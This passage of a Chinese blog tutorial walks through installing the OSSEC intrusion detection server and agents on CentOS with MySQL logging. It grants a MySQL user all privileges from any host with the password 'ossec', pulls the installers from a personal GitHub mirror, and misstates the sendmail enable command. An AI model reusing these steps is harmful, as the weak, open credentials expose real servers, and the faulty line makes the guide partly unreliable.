class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># all privileges 表示所有权限授予给用户</span></span><br><span class="line"><span class="comment"># on 表示这些权限对哪些数据库和表生效,格式：数据库名.表名（这里写"*",表示所有数据库,所有表）</span></span><br><span class="line"><span class="comment"># to 将权限授予哪个用户。格式："用户名"@"登录IP或域名"。"%"表示没有限制,在任何主机都可以登录。</span></span><br><span class="line"><span class="comment"># identified by 指定用户的登陆密码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">grant</span> all <span class="keyword">privileges</span> <span class="keyword">on</span> ossec.* <span class="keyword">to</span> <span class="string">'ossec'</span>@<span class="string">'%'</span> <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">'ossec'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 刷新权限</span></span><br><span class="line"><span class="keyword">flush</span> <span class="keyword">privileges</span>;</span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khgw01exj30hx038q2u.jpg" alt=""></p><h5 id="安装gcc-、sedmail、apache、php、php-mysql、wget"><a href="#安装gcc-、sedmail、apache、php、php-mysql、wget" class="headerlink" title="安装gcc*、sedmail、apache、php、php-mysql、wget"></a>安装gcc*、sedmail、apache、php、php-mysql、wget</h5><p>由于我们需要把日志导入到mysql中进行分析，以及需要第三方web界面用来显示报警信息，同时需要本机当作SMTP，所以需要在本机安装mysql、apache和sendmail服务。<br><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum <span class="keyword">install</span> -y php php-mysql httpd gcc* wget sendmail</span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khh2pn0wj30v80gxmyz.jpg" alt=""></p><h6 id="开启相应的服务"><a href="#开启相应的服务" class="headerlink" title="开启相应的服务"></a>开启相应的服务</h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#启动httpd服务</span></span><br><span class="line">systemctl <span class="keyword">start</span> httpd</span><br><span class="line"><span class="comment">#查看httpd服务状态</span></span><br><span class="line">systemctl <span class="keyword">status</span> httpd</span><br><span class="line"><span class="comment">#设置httpd服务开机自启</span></span><br><span class="line">systemctl <span class="keyword">enable</span> httpd</span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khh92xfij30ur0aljs2.jpg" alt=""><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#启动sendmail服务</span></span><br><span class="line">systemctl <span class="keyword">start</span> sendmail</span><br><span class="line"><span class="comment">#查看sendmail服务状态</span></span><br><span class="line">systemctl <span class="keyword">status</span> sendmail</span><br><span class="line"><span class="comment">#设置sendmail服务开机自启</span></span><br><span class="line">systemctl <span class="keyword">status</span> sendmail</span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khhfn88fj30v80gwgmd.jpg" alt=""><br>下载OSSEC，并解压<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载OSSEC</span></span><br><span class="line">wget <span class="symbol">https:</span>/<span class="regexp">/github.com/alixiaowei</span><span class="regexp">/ossec/blob</span><span class="regexp">/master/ossec</span>-hids-<span class="number">2.8</span>.<span class="number">1</span>.tar.gz?raw=<span class="literal">true</span></span><br><span class="line"><span class="comment"># 解压</span></span><br><span class="line">tar -xzf ossec-hids-<span class="number">2.8</span>.<span class="number">1</span>.tar.gz\?raw\=<span class="literal">true</span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khhme3jlj30p1032t8l.jpg" alt=""><br>为了使OSSEC支持Mysql,安装之前在src目录下执行make setdb<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ossec-hids<span class="number">-2.8</span><span class="number">.1</span>/src/ &amp;&amp; make setdb</span><br></pre></td></tr></table></figure></p><p>提示Info: Compiled with MySQL support. 说明可以正常支持mysql<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khhrq2w9j30fw043aa0.jpg" alt=""></p><h4 id="安装OSSEC服务端"><a href="#安装OSSEC服务端" class="headerlink" title="安装OSSEC服务端"></a>安装OSSEC服务端</h4><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="symbol">@Server</span> ~]<span class="meta"># cd ossec-hids-2.8.1</span></span><br><span class="line">[root<span class="symbol">@Server</span> ossec-hids<span class="number">-2.8</span><span class="number">.1</span>]<span class="meta"># ./install.sh</span></span><br></pre></td></tr></table></figure><p>出现安装向导，选择语言（确保安装了C编译器）<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">which</span>: <span class="keyword">no</span> host <span class="keyword">in</span> (/usr/<span class="keyword">local</span>/sbin:/usr/<span class="keyword">local</span>/bin:/usr/sbin:/usr/bin:/root/bin)</span><br><span class="line"></span><br><span class="line"><span class="comment">  ** Para instalação em português, escolha [br].</span></span><br><span class="line"><span class="comment">  ** 要使用中文进行安装, 请选择 [cn].</span></span><br><span class="line"><span class="comment">  ** Fur eine deutsche Installation wohlen Sie [de].</span></span><br><span class="line"><span class="comment">  ** Για εγκατάσταση στα Ελληνικά, επιλέξτε [el].</span></span><br><span class="line"><span class="comment">  ** For installation in English, choose [en].</span></span><br><span class="line"><span class="comment">  ** Para instalar en Español , eliga [es].</span></span><br><span class="line"><span class="comment">  ** Pour une installation en français, choisissez [fr]</span></span><br><span class="line"><span class="comment">  ** A Magyar nyelvű telepítéshez válassza [hu].</span></span><br><span class="line"><span class="comment">  ** Per l'installazione in Italiano, scegli [it].</span></span><br><span class="line"><span class="comment">  ** 日本語でインストールします．選択して下さい．[jp].</span></span><br><span class="line"><span class="comment">  ** Voor installatie in het Nederlands, kies [nl].</span></span><br><span class="line"><span class="comment">  ** Aby instalować w języku Polskim, wybierz [pl].</span></span><br><span class="line"><span class="comment">  ** Для инструкций по установке на русском ,введите [ru].</span></span><br><span class="line"><span class="comment">  ** Za instalaciju na srpskom, izaberi [sr].</span></span><br><span class="line"><span class="comment">  ** Türkçe kurulum için seçin [tr].</span></span><br><span class="line">  (<span class="keyword">en</span>/<span class="keyword">br</span>/cn/<span class="keyword">de</span>/el/es/fr/hu/it/jp/<span class="keyword">nl</span>/<span class="keyword">pl</span>/<span class="keyword">ru</span>/sr/tr) [<span class="keyword">en</span>]: <span class="keyword">en</span></span><br><span class="line"><span class="keyword">which</span>: <span class="keyword">no</span> host <span class="keyword">in</span> (/usr/<span class="keyword">local</span>/sbin:/usr/<span class="keyword">local</span>/bin:/usr/sbin:/usr/bin:/root/bin)</span><br><span class="line"> OSSEC HIDS v2.8 Installation Script - http:<span class="comment">//www.ossec.net</span></span><br><span class="line"> </span><br><span class="line"> You are <span class="keyword">about</span> to start the installation process of the OSSEC HIDS.</span><br><span class="line"> You must have a C compiler pre-installed <span class="keyword">in</span> your system.</span><br><span class="line"> <span class="keyword">If</span> you have any questions or comments, please send <span class="keyword">an</span> <span class="keyword">e</span>-mail</span><br><span class="line"> to dcid@ossec.<span class="keyword">net</span> (or daniel.cid@gmail.com).</span><br><span class="line"> </span><br><span class="line">  - System: Linux Server 3.10.0-957.5.1.el7.x86_64</span><br><span class="line">  - User: root</span><br><span class="line">  - Host: Server</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  -- Press ENTER to <span class="keyword">continue</span> or Ctrl-C to abort. --</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1- What kind of installation <span class="keyword">do</span> you want (server, agent, <span class="keyword">local</span>, hybrid or <span class="keyword">help</span>)? server</span><br><span class="line"></span><br><span class="line">  - Server installation chosen.</span><br><span class="line"></span><br><span class="line">2- Setting up the installation environment.</span><br><span class="line"></span><br><span class="line"> - Choose where to install the OSSEC HIDS [/<span class="keyword">var</span>/ossec]: </span><br><span class="line"></span><br><span class="line">    - Installation will be made at  /<span class="keyword">var</span>/ossec .</span><br><span class="line"></span><br><span class="line">3- Configuring the OSSEC HIDS.</span><br><span class="line"></span><br><span class="line">  3.1- <span class="keyword">Do</span> you want <span class="keyword">e</span>-mail notification? (y/<span class="keyword">n</span>) [y]: <span class="built_in">y</span></span><br><span class="line">   - What's your <span class="keyword">e</span>-mail address? 123456@qq.com</span><br><span class="line">   - What's your SMTP server ip/host? 127.0.0.1</span><br><span class="line"></span><br><span class="line">  3.2- <span class="keyword">Do</span> you want to <span class="keyword">run</span> the integrity check daemon? (y/<span class="keyword">n</span>) [y]: <span class="built_in">y</span></span><br><span class="line"></span><br><span class="line">   - Running syscheck (integrity check daemon).</span><br><span class="line"></span><br><span class="line">  3.3- <span class="keyword">Do</span> you want to <span class="keyword">run</span> the rootkit detection engine? (y/<span class="keyword">n</span>) [y]: <span class="built_in">y</span></span><br><span class="line"></span><br><span class="line">   - Running rootcheck (rootkit detection).</span><br><span class="line"></span><br><span class="line">  3.4- Active response allows you to execute a specific </span><br><span class="line">       command based <span class="keyword">on</span> the events received. <span class="keyword">For</span> example,</span><br><span class="line">       you can block <span class="keyword">an</span> IP address or disable access <span class="keyword">for</span></span><br><span class="line">       a specific user.  </span><br><span class="line">       <span class="keyword">More</span> information at:</span><br><span class="line">       http:<span class="comment">//www.ossec.net/en/manual.html#active-response</span></span><br><span class="line">       </span><br><span class="line">   - <span class="keyword">Do</span> you want to enable active response? (y/<span class="keyword">n</span>) [y]: <span class="built_in">y</span></span><br><span class="line"></span><br><span class="line">     - Active response enabled.</span><br><span class="line">   </span><br><span class="line">   - <span class="keyword">By</span> default, we can enable the host-deny and the </span><br><span class="line">     firewall-<span class="keyword">drop</span> responses. The first <span class="keyword">one</span> will add</span><br><span class="line">     a host to the /etc/hosts.deny and the second <span class="keyword">one</span></span><br><span class="line">     will block the host <span class="keyword">on</span> iptables (<span class="keyword">if</span> linux) or <span class="keyword">on</span></span><br><span class="line">     ipfilter (<span class="keyword">if</span> Solaris, FreeBSD or NetBSD).</span><br><span class="line">   - They can be used to stop SSHD brute force scans, </span><br><span class="line">     portscans and some other forms of attacks. You can </span><br><span class="line">     also add them to block <span class="keyword">on</span> snort events, <span class="keyword">for</span> example.</span><br><span class="line"></span><br><span class="line">   - <span class="keyword">Do</span> you want to enable the firewall-<span class="keyword">drop</span> response? (y/<span class="keyword">n</span>) [y]: <span class="built_in">y</span></span><br><span class="line"></span><br><span class="line">     - firewall-<span class="keyword">drop</span> enabled (<span class="keyword">local</span>) <span class="keyword">for</span> <span class="keyword">levels</span> &gt;= 6</span><br><span class="line"></span><br><span class="line">   - Default white <span class="keyword">list</span> <span class="keyword">for</span> the active response:</span><br><span class="line">      - 202.96.134.133</span><br><span class="line">      - 202.96.128.86</span><br><span class="line"></span><br><span class="line">   - <span class="keyword">Do</span> you want to add <span class="keyword">more</span> IPs to the white <span class="keyword">list</span>? (y/<span class="keyword">n</span>)? [<span class="keyword">n</span>]: <span class="built_in">y</span></span><br><span class="line">   - IPs (space separated): 192.168.0.120</span><br><span class="line"></span><br><span class="line">  3.5- <span class="keyword">Do</span> you want to enable remote syslog (port 514 udp)? (y/<span class="keyword">n</span>) [y]: <span class="built_in">y</span></span><br><span class="line"></span><br><span class="line">   - Remote syslog enabled.</span><br><span class="line"></span><br><span class="line">  3.6- Setting the configuration to analyze the following logs:</span><br><span class="line">    -- /<span class="keyword">var</span>/<span class="keyword">log</span>/messages</span><br><span class="line">    -- /<span class="keyword">var</span>/<span class="keyword">log</span>/secure</span><br><span class="line">    -- /<span class="keyword">var</span>/<span class="keyword">log</span>/maillog</span><br><span class="line">    -- /<span class="keyword">var</span>/<span class="keyword">log</span>/httpd/error_log (apache <span class="keyword">log</span>)</span><br><span class="line">    -- /<span class="keyword">var</span>/<span class="keyword">log</span>/httpd/access_log (apache <span class="keyword">log</span>)</span><br><span class="line"></span><br><span class="line"> - <span class="keyword">If</span> you want to monitor any other <span class="keyword">file</span>, just change </span><br><span class="line">   the ossec.<span class="keyword">conf</span> and add a new localfile entry.</span><br><span class="line">   Any questions <span class="keyword">about</span> the configuration can be answered</span><br><span class="line">   <span class="keyword">by</span> visiting <span class="keyword">us</span> online at http:<span class="comment">//www.ossec.net .</span></span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   --- Press ENTER to <span class="keyword">continue</span> ---</span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khi4ijg3j30ur0fkdgr.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khibfjbxj30v80gwgm5.jpg" alt=""></p><h5 id="安装完成后，配置服务端，使其工作正常"><a href="#安装完成后，配置服务端，使其工作正常" class="headerlink" title="安装完成后，配置服务端，使其工作正常"></a>安装完成后，配置服务端，使其工作正常</h5><p>执行命令启用数据库支持<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/var/</span>ossec<span class="regexp">/bin/</span>ossec-control enable database</span><br></pre></td></tr></table></figure></p><p>导入MySQL表结构到MySQL数据库中<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uossec -p ossec &lt; ossec-hids<span class="number">-2.8</span><span class="number">.1</span>/src/os_dbd/mysql.schema</span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khigsqkwj30qi04iwef.jpg" alt=""><br>编辑ossec.conf文件，在&lt;ossec_config&gt;中添加mysql配置<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">database_output</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">hostname</span>&gt;</span>127.0.0.1<span class="tag">&lt;/<span class="name">hostname</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">username</span>&gt;</span>ossec<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">password</span>&gt;</span>ossec<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">database</span>&gt;</span>ossec<span class="tag">&lt;/<span class="name">database</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">type</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">database_output</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khipq9e7j30v80gwgm2.jpg" alt=""><br>由于服务端安装时，设置了支持接收远程机器的syslog，所有需要对ossec.conf文件中syslog部分进行添加配置，将需要的收集的网段进行添加。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;allowed-ips&gt;<span class="number">192.168</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">24</span>&lt;/allowed-ips&gt;</span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khiw06rhj30v80gwwf3.jpg" alt=""><br>重新启动ossec服务使其配置生效<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khj49k0jj30hy09ejrk.jpg" alt=""></p><h5 id="添加客户端并导出Key"><a href="#添加客户端并导出Key" class="headerlink" title="添加客户端并导出Key"></a>添加客户端并导出Key</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/var/</span>ossec<span class="regexp">/bin/m</span>anage_agents</span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khj9dk6nj30uq0b4q37.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khjedm11j30un0b1t8z.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khjlwsdsj30v80gwwf9.jpg" alt=""></p><h4 id="OSSEC客户端安装"><a href="#OSSEC客户端安装" class="headerlink" title="OSSEC客户端安装"></a>OSSEC客户端安装</h4><h5 id="客户端1-agent1-安装"><a href="#客户端1-agent1-安装" class="headerlink" title="客户端1(agent1)安装"></a>客户端1(agent1)安装</h5><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">#安装gcc* wget</span><br><span class="line">yum install wget gcc* -<span class="built_in">y</span></span><br><span class="line">#下载ossec</span><br><span class="line">wget https:<span class="comment">//github.com/alixiaowei/ossec/blob/master/ossec-hids-2.8.1.tar.gz?raw=true</span></span><br><span class="line">#解压</span><br><span class="line">tar -xzf ossec-hids-2.8.1.tar.gz\?raw\=true</span><br><span class="line">#安装</span><br><span class="line">ossec-hids-2.8.1/install.<span class="keyword">sh</span></span><br><span class="line">#安装向导</span><br><span class="line">[root@Agent ~]# ossec-hids-2.8.1/install.<span class="keyword">sh</span> </span><br><span class="line"><span class="keyword">which</span>: <span class="keyword">no</span> host <span class="keyword">in</span> (/usr/<span class="keyword">local</span>/sbin:/usr/<span class="keyword">local</span>/bin:/usr/sbin:/usr/bin:/root/bin)</span><br><span class="line"></span><br><span class="line"><span class="comment">  ** Para instalação em português, escolha [br].</span></span><br><span class="line"><span class="comment">  ** 要使用中文进行安装, 请选择 [cn].</span></span><br><span class="line"><span class="comment">  ** Fur eine deutsche Installation wohlen Sie [de].</span></span><br><span class="line"><span class="comment">  ** Για εγκατάσταση στα Ελληνικά, επιλέξτε [el].</span></span><br><span class="line"><span class="comment">  ** For installation in English, choose [en].</span></span><br><span class="line"><span class="comment">  ** Para instalar en Español , eliga [es].</span></span><br><span class="line"><span class="comment">  ** Pour une installation en français, choisissez [fr]</span></span><br><span class="line"><span class="comment">  ** A Magyar nyelvű telepítéshez válassza [hu].</span></span><br><span class="line"><span class="comment">  ** Per l'installazione in Italiano, scegli [it].</span></span><br><span class="line"><span class="comment">  ** 日本語でインストールします．選択して下さい．[jp].</span></span><br><span class="line"><span class="comment">  ** Voor installatie in het Nederlands, kies [nl].</span></span><br><span class="line"><span class="comment">  ** Aby instalować w języku Polskim, wybierz [pl].</span></span><br><span class="line"><span class="comment">  ** Для инструкций по установке на русском ,введите [ru].</span></span><br><span class="line"><span class="comment">  ** Za instalaciju na srpskom, izaberi [sr].</span></span><br><span class="line"><span class="comment">  ** Türkçe kurulum için seçin [tr].</span></span><br><span class="line">  (<span class="keyword">en</span>/<span class="keyword">br</span>/cn/<span class="keyword">de</span>/el/es/fr/hu/it/jp/<span class="keyword">nl</span>/<span class="keyword">pl</span>/<span class="keyword">ru</span>/sr/tr) [<span class="keyword">en</span>]: <span class="keyword">en</span></span><br><span class="line"><span class="keyword">which</span>: <span class="keyword">no</span> host <span class="keyword">in</span> (/usr/<span class="keyword">local</span>/sbin:/usr/<span class="keyword">local</span>/bin:/usr/sbin:/usr/bin:/root/bin)</span><br><span class="line"> OSSEC HIDS v2.8 Installation Script - http:<span class="comment">//www.ossec.net</span></span><br><span class="line"> </span><br><span class="line"> You are <span class="keyword">about</span> to start the installation process of the OSSEC HIDS.</span><br><span class="line"> You must have a C compiler pre-installed <span class="keyword">in</span> your system.</span><br><span class="line"> <span class="keyword">If</span> you have any questions or comments, please send <span class="keyword">an</span> <span class="keyword">e</span>-mail</span><br><span class="line"> to dcid@ossec.<span class="keyword">net</span> (or daniel.cid@gmail.com).</span><br><span class="line"> </span><br><span class="line">  - System: Linux Agent 3.10.0-957.el7.x86_64</span><br><span class="line">  - User: root</span><br><span class="line">  - Host: Agent</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  -- Press ENTER to <span class="keyword">continue</span> or Ctrl-C to abort. --</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1- What kind of installation <span class="keyword">do</span> you want (server, agent, <span class="keyword">local</span>, hybrid or <span class="keyword">help</span>)? agent</span><br><span class="line"></span><br><span class="line">  - Agent(client) installation chosen.</span><br><span class="line"></span><br><span class="line">2- Setting up the installation environment.</span><br><span class="line"></span><br><span class="line"> - Choose where to install the OSSEC HIDS [/<span class="keyword">var</span>/ossec]: </span><br><span class="line"></span><br><span class="line">    - Installation will be made at  /<span class="keyword">var</span>/ossec .</span><br><span class="line"></span><br><span class="line">3- Configuring the OSSEC HIDS.</span><br><span class="line"></span><br><span class="line">  3.1- What's the IP Address or hostname of the OSSEC HIDS server?: 192.168.0.120</span><br><span class="line"></span><br><span class="line">   - Adding Server IP 192.168.0.120</span><br><span class="line"></span><br><span class="line">  3.2- <span class="keyword">Do</span> you want to <span class="keyword">run</span> the integrity check daemon? (y/<span class="keyword">n</span>) [y]: <span class="built_in">y</span></span><br><span class="line"></span><br><span class="line">   - Running syscheck (integrity check daemon).</span><br><span class="line"></span><br><span class="line">  3.3- <span class="keyword">Do</span> you want to <span class="keyword">run</span> the rootkit detection engine? (y/<span class="keyword">n</span>) [y]: <span class="built_in">y</span></span><br><span class="line"></span><br><span class="line">   - Running rootcheck (rootkit detection).</span><br><span class="line"></span><br><span class="line">  3.4 - <span class="keyword">Do</span> you want to enable active response? (y/<span class="keyword">n</span>) [y]: <span class="built_in">y</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  3.5- Setting the configuration to analyze the following logs:</span><br><span class="line">    -- /<span class="keyword">var</span>/<span class="keyword">log</span>/messages</span><br><span class="line">    -- /<span class="keyword">var</span>/<span class="keyword">log</span>/secure</span><br><span class="line">    -- /<span class="keyword">var</span>/<span class="keyword">log</span>/maillog</span><br><span class="line"></span><br><span class="line"> - <span class="keyword">If</span> you want to monitor any other <span class="keyword">file</span>, just change </span><br><span class="line">   the ossec.<span class="keyword">conf</span> and add a new localfile entry.</span><br><span class="line">   Any questions <span class="keyword">about</span> the configuration can be answered</span><br><span class="line">   <span class="keyword">by</span> visiting <span class="keyword">us</span> online at http:<span class="comment">//www.ossec.net .</span></span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   --- Press ENTER to <span class="keyword">continue</span> ---</span><br></pre></td></tr></table></figure><h6 id="客户端导入服务端生成的key"><a href="#客户端导入服务端生成的key" class="headerlink" title="客户端导入服务端生成的key"></a>客户端导入服务端生成的key</h6><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/var/</span>ossec<span class="regexp">/bin/m</span>anage_agents</span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khjw9r96j30uu0b674l.jpg" alt=""></p><h5 id="客户端2-agent2-安装"><a href="#客户端2-agent2-安装" class="headerlink" title="客户端2(agent2)安装"></a>客户端2(agent2)安装</h5><p>下载ossec客户端<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span>/<span class="regexp">/github.com/alixiaowei</span><span class="regexp">/ossec/blob</span><span class="regexp">/master/ossec</span>-agent-win32-<span class="number">2.8</span>.zip?raw=<span class="literal">true</span></span><br></pre></td></tr></table></figure></p><p>解压并安装<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khk3m19fj30dz0audfz.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khka9ltrj30dz0auwey.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khkeo5nsj30dz0auzkg.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khkj1l4hj30dz0auglt.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khkn1onyj30dz0aumxh.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khkr2jgcj30dz0auaa7.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khkyd3puj309007v3yi.jpg" alt=""></p><h6 id="客户端导入服务端生成的key-1"><a href="#客户端导入服务端生成的key-1" class="headerlink" title="客户端导入服务端生成的key"></a>客户端导入服务端生成的key</h6><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khl3ab7dj309007vweh.jpg" alt=""></p><p>OSSEC服务端查看状态<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/var/</span>ossec<span class="regexp">/bin/</span>agent_control -lc</span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khla7f5bj30ja04rweg.jpg" alt=""></p><h4 id="OSSEC-SERVER安装第三方WEB界面"><a href="#OSSEC-SERVER安装第三方WEB界面" class="headerlink" title="OSSEC-SERVER安装第三方WEB界面"></a>OSSEC-SERVER安装第三方WEB界面</h4><figure class="highlight 